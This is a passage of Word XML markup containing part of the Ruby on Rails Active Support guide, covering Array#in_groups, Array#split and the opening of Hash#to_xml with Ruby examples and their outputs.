              <w:t>6</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>7).in_groups(3)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D75BA86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; [["1", "2", "3"], ["4", "5", nil], ["6", "7", nil]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26DC71A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>or yields them in turn if a block is passed:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5325"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1ADD69ED" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7200D048" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>7).in_groups(3) {|group| p group}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24435856" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>["1", "2", "3"]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46A0B096" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>["4", "5", nil]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DA34010" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>["6", "7", nil]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B3560D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The examples above show that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_groups</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fills some groups with a trailing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> element as needed. A group can get at most one of these extra elements, the rightmost one if any. And the groups that have them are always the last ones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D11DB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can change this padding value using the second optional argument:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0CD3FBBF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="366D570F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>7).in_groups(3, "0")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BB1BE08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; [["1", "2", "3"], ["4", "5", "0"], ["6", "7", "0"]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B6D82C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And you can tell the method not to fill the smaller groups passing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="19802F6D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="733E4B67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>7).in_groups(3, false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37DFA315" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; [["1", "2", "3"], ["4", "5"], ["6", "7"]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="65A8376C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As a consequence </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can’t be a used as a padding value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01630760" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/grouping.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1E98E2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.6.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>split(value = nil)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DBF9FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>split</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> divides an array by a separator and returns the resulting chunks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0911FC5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If a block is passed the separators are those elements of the array for which the block returns true:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="23D9D3EC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="120B17A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(-5..5).to_a.split { |i| i.multiple_of?(4) }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E9777C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; [[-5], [-3, -2, -1], [1, 2, 3], [5]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="76A3D009" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Otherwise, the value received as argument, which defaults to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>, is the separator:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0497A523" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0570D82B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[0, 1, -5, 1, 1, "foo", "bar"].split(1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55219681" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; [[0], [-5], [], ["foo", "bar"]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="48A6F420" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Observe in the previous example that consecutive separators result in empty arrays.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F0433F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/grouping.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675096A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Hash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AFC163" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.1 Conversions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069AA219" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75495638" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a string containing an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> representation of its receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3A581E95" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="197DAAF1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{"foo"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, "bar"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}.to_xml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05139820" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BBFBC6B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65AC48EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;hash&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D76E087" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;foo type="integer"&gt;1&lt;/foo&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74905D80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;bar type="integer"&gt;2&lt;/bar&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="615FFC1F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;/hash&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="619A147E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To do so, the method loops over the pairs and builds nodes that depend on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>values</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Given a pair </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1101DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="281"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a hash there’s a recursive call with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:root</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8137D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="282"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is an array there’s a recursive call with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:root</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> singularized as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:children</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4790DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="283"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a callable object it must expect one or two arguments. Depending on the arity, the callable is invoked with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
